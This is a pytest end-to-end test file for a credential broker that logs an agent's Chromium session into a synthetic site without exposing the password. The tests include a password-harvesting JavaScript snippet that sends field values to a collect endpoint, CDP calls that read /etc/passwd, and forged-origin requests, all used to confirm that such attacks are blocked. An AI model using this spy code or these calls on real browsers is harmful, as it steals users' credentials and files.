"""End-to-end tests against a real Chromium and the synthetic site."""
import asyncio
import json

import aiohttp
import pytest

from conftest import AgentCDP
from gatehouse import login as L
from fakesite import PASSWORD, TOTP_SECRET, USER


async def test_login_and_agent_resumes_in_authenticated_session(env, agent_cdp):
    cid = env.add_account()
    env.grant(cid)
    r = await env.login(cid)
    assert r["status"] == L.SIGNED_IN, r
    assert env.site.received == [(f"127.0.0.1:{env.port_a}", PASSWORD)]
    # the relay was shut during login; the agent reconnects and finds the signed-in tab
    with pytest.raises(Exception):
        await agent_cdp.call("Browser.getVersion")
    ws = await env.http.ws_connect(env.relay_url(), max_msg_size=0)
    agent = AgentCDP(ws)
    sid = await agent.page()
    assert "Signed in as reader" in await agent.evaluate(sid, "document.body.innerText")
    await ws.close()


async def test_repeat_logins_within_grant_need_no_new_approval(env):
    cid = env.add_account()
    env.grant(cid)
    assert (await env.login(cid))["status"] == L.SIGNED_IN
    assert (await env.login(cid))["status"] == L.ALREADY
    assert env.site.posts == 1                       # session reused, password sent once
    assert env.store.approvals() == []


async def test_multi_step_form(env):
    cid = env.add_account("/step")
    env.grant(cid)
    assert (await env.login(cid))["status"] == L.SIGNED_IN


async def test_totp(env):
    from gatehouse import totp
    cid = env.add_account("/totp-login", totp=totp.parse_secret(TOTP_SECRET))
    env.grant(cid)
    assert (await env.login(cid))["status"] == L.SIGNED_IN


async def test_otp_without_secret_waits_for_human_then_times_out(env):
    cid = env.add_account("/totp-login")
    env.grant(cid)
    r = await env.login(cid)
    assert (r["status"], r["detail"]) == (L.FAILED, "human_verification_timeout")


async def test_wrong_password_is_tried_once_then_blocked(env):
    cid = env.add_account(password="wrong-synthetic-password")
    env.grant(cid)
    r = await env.login(cid)
    assert (r["status"], r["detail"]) == (L.FAILED, "credentials_rejected")
    assert env.site.posts == 1
    await env.login(cid)
    r = await env.login(cid)                         # third call never reaches the site
    assert r["detail"] == "blocked_after_repeated_failures_user_must_reset"
    assert env.site.posts == 2


async def test_redirect_to_unapproved_origin_gets_no_password(env):
    cid = env.add_account("/redirect-login")
    env.grant(cid)
    r = await env.login(cid)
    assert (r["status"], r["detail"]) == (L.PERMISSION_REQUIRED, "redirected_to_unapproved_origin")
    assert env.site.received == []
    assert [a["origin"] for a in env.store.approvals()] == [env.other]   # queued for the user, not auto-granted


async def test_form_posting_to_unapproved_origin_gets_no_password(env):
    cid = env.add_account("/crossform")
    env.grant(cid)
    r = await env.login(cid)
    assert (r["status"], r["detail"]) == (L.FAILED, "form_action_mismatch")
    assert env.site.received == []


async def test_captcha_handoff_resumes_after_human(env):
    cid = env.add_account("/captcha-login")
    env.grant(cid)
    sid = await env.session_id()
    _, r = await env.api("/v1/login", {"account_id": cid, "browser_session_id": sid})
    for _ in range(40):
        await asyncio.sleep(0.25)
        _, st = await env.api("/v1/login/status", {"request_id": r["request_id"]})
        if st["status"] == L.HUMAN:
            break
    assert st["status"] == L.HUMAN
    # while a person is solving, the agent cannot attach
    async with env.http.get(env.relay_url().replace("ws://", "http://")) as resp:
        assert resp.status == 423
    env.site.captcha_solved = True                   # the "human" solves it
    for _ in range(60):
        await asyncio.sleep(0.25)
        _, st = await env.api("/v1/login/status", {"request_id": r["request_id"]})
        if st["status"] not in (L.HUMAN, L.PENDING):
            break
    assert st["status"] == L.SIGNED_IN


async def test_agent_cannot_observe_the_protected_phase(env, agent_cdp):
    """An agent that prepares every hook the relay allows still gets nothing."""
    cid = env.add_account()
    env.grant(cid)
    spy = ("setInterval(() => { for (const i of document.querySelectorAll('input[type=password]')) "
           f"if (i.value) fetch('{env.origin}/collect?d=' + encodeURIComponent(i.value)); }}, 20);")
    sid = await agent_cdp.page(env.origin + "/login")
    await agent_cdp.call("Page.enable", {}, sid)
    await agent_cdp.call("Page.addScriptToEvaluateOnNewDocument", {"source": spy}, sid)
    await agent_cdp.call("Target.setAutoAttach", {"autoAttach": True, "waitForDebuggerOnStart": True, "flatten": True})
    await agent_cdp.call("Target.setDiscoverTargets", {"discover": True})
    await agent_cdp.evaluate(sid, spy)
    # control: the spy does work in a tab the agent controls
    await agent_cdp.evaluate(sid, "document.querySelector('input[type=password]').value = 'canary'")
    await asyncio.sleep(0.5)
    assert "canary" in env.site.collected
    await agent_cdp.evaluate(sid, "document.querySelector('input[type=password]').value = ''")
    await asyncio.sleep(0.5)
    env.site.collected.clear()
    await agent_cdp.call("Fetch.enable", {"patterns": [{"urlPattern": "*"}]}, sid)   # request interception too
    r = await env.login(cid)
    assert r["status"] == L.SIGNED_IN, r
    assert env.site.collected == []
    # nothing the agent received over the relay contains the password
    frames = [str(e) for e in agent_cdp.events]
    while True:
        frame = await agent_cdp.ws.receive(timeout=1)
        if frame.type != aiohttp.WSMsgType.TEXT:
            break
        frames.append(frame.data)
    assert not any(PASSWORD in f for f in frames)


async def test_secrets_absent_from_state_and_api_output(env):
    cid = env.add_account()
    env.grant(cid)
    r = await env.login(cid)
    _, accounts = await env.api("/v1/accounts")
    assert accounts["accounts"][0]["username"] == USER
    blob = str(r) + str(accounts)
    for path in env.paths.home.iterdir():
        if path.is_file():
            blob += path.read_bytes().decode("latin-1")
    assert PASSWORD not in blob
    assert all(PASSWORD not in str(tuple(row)) for row in env.store.audit_rows(1000))


async def test_logout_clears_local_session(env):
    cid = env.add_account()
    env.grant(cid)
    assert (await env.login(cid))["status"] == L.SIGNED_IN
    _, r = await env.api("/v1/logout", {"account_id": cid, "browser_session_id": await env.session_id()})
    assert r["status"] == "local_session_removed"
    assert (await env.login(cid))["status"] == L.SIGNED_IN
    assert env.site.posts == 2


async def test_relay_refuses_dangerous_commands(env, agent_cdp):
    sid = await agent_cdp.page()
    for method, params, s in [("Page.navigate", {"url": "file:///etc/passwd"}, sid),
                              ("Page.navigate", {"url": "chrome://settings"}, sid),
                              ("Target.createTarget", {"url": "file:///etc/passwd"}, None),
                              ("DOM.setFileInputFiles", {"files": ["/etc/passwd"]}, sid),
                              ("Tracing.start", {}, None), ("Browser.close", {}, None),
                              ("Target.attachToBrowserTarget", {}, None), ("SystemInfo.getInfo", {}, None),
                              ("Security.setIgnoreCertificateErrors", {"ignore": True}, sid),
                              ("Target.sendMessageToTarget", {"message": "{}", "sessionId": sid}, None),
                              ("Input.dispatchDragEvent", {"type": "drop", "x": 1, "y": 1,
                                                           "data": {"items": [], "dragOperationsMask": 1}}, sid),
                              ("Page.handleFileChooser", {"action": "accept", "files": ["/etc/passwd"]}, sid),
                              ("Target.exposeDevToolsProtocol", {"targetId": "x"}, None),
                              ("Runtime.evaluate", {"expression": "1"}, None)]:
        assert "error" in await agent_cdp.call(method, params, s), method
    assert (await agent_cdp.call("Browser.getVersion"))["result"]["product"]


async def test_relay_forces_flat_sessions(env, agent_cdp):
    """A non-flat attach would tunnel commands through sendMessageToTarget, past the filter."""
    targets = (await agent_cdp.call("Target.getTargets"))["result"]["targetInfos"]
    tid = next(t["targetId"] for t in targets if t["type"] == "page")
    sid = (await agent_cdp.call("Target.attachToTarget", {"targetId": tid, "flatten": False}))["result"]["sessionId"]
    assert await agent_cdp.evaluate(sid, "1 + 1") == 2      # works only if the session is flat
    assert "error" in await agent_cdp.call("DOM.setFileInputFiles", {"files": ["/etc/passwd"]}, sid)


async def test_relay_needs_the_agents_token(env):
    await env.session_id()
    async with env.http.get(f"http://127.0.0.1:{env.port}/cdp/not-a-token/json/version") as resp:
        assert resp.status == 403
    async with env.http.get(f"http://127.0.0.1:{env.port}/cdp/{env.agent['cdp_token']}/json/version",
                            headers={"Origin": "https://evil.example"}) as resp:
        assert resp.status == 403


async def test_playwright_can_drive_the_browser_through_the_relay(env):
    """A stock browser tool (Playwright over CDP) works before and after a brokered login."""
    pw = pytest.importorskip("playwright.async_api")
    cid = env.add_account()
    env.grant(cid)
    await env.session_id()
    endpoint = f"http://127.0.0.1:{env.port}/cdp/{env.agent['cdp_token']}"
    async with pw.async_playwright() as p:
        browser = await p.chromium.connect_over_cdp(endpoint)
        page = await browser.contexts[0].new_page()
        await page.goto(env.origin + "/home")
        assert "/login" in page.url
        assert (await env.login(cid))["status"] == L.SIGNED_IN
        browser = await p.chromium.connect_over_cdp(endpoint)      # reconnect after the protected phase
        page = browser.contexts[0].pages[0]
        assert "Signed in as reader" in await page.inner_text("body")
        await page.goto(env.origin + "/home")
        assert await page.locator("#account").count() == 1


async def _wait_status(env, request_id, want, tries=80):
    for _ in range(tries):
        await asyncio.sleep(0.25)
        _, st = await env.api("/v1/login/status", {"request_id": request_id})
        if st["status"] == want:
            return st
    return st


async def test_human_handoff_page_streams_and_replays_input(env):
    cid = env.add_account("/captcha-login")
    env.grant(cid)
    sid = await env.session_id()
    _, r = await env.api("/v1/login", {"account_id": cid, "browser_session_id": sid})
    assert (await _wait_status(env, r["request_id"], L.HUMAN))["status"] == L.HUMAN
    [handoff] = json.loads(env.store.get_setting("handoffs"))
    assert handoff["account_id"] == cid and handoff["request_id"] == r["request_id"]
    base = f"http://127.0.0.1:{env.port}/handoff/{handoff['token']}"

    jar = aiohttp.CookieJar(unsafe=True)                         # browsers keep cookies for 127.0.0.1
    async with aiohttp.ClientSession(cookie_jar=jar) as viewer, aiohttp.ClientSession() as other:
        async with viewer.get(base) as resp:                     # first browser claims the link
            assert resp.status == 200 and "gh_handoff" in resp.cookies
        async with other.get(base) as resp:                      # any other browser is refused
            assert resp.status == 403
        async with other.get(base + "/ws") as resp:
            assert resp.status == 403
        async with viewer.get(base, headers={"Origin": "https://evil.example"}) as resp:
            assert resp.status == 403
        async with viewer.ws_connect(base + "/ws", origin=f"http://127.0.0.1:{env.port}") as ws:
            frame = json.loads((await ws.receive(timeout=15)).data)
            assert frame["t"] == "frame" and frame["data"]
            # click the page's "I am human" button through the live view
            x, y = 50 / frame["w"], 50 / frame["h"]
            for typ in ("mousePressed", "mouseReleased"):
                await ws.send_str(json.dumps({"t": "mouse", "type": typ, "x": x, "y": y, "button": "left", "clicks": 1}))
            while True:
                msg = await ws.receive(timeout=20)
                if msg.type != aiohttp.WSMsgType.TEXT or json.loads(msg.data)["t"] == "done":
                    break
    assert env.site.captcha_solved
    assert (await _wait_status(env, r["request_id"], L.SIGNED_IN))["status"] == L.SIGNED_IN
    assert json.loads(env.store.get_setting("handoffs")) == []
    async with env.http.get(base) as resp:                        # link is dead once the sign-in moves on
        assert resp.status == 404
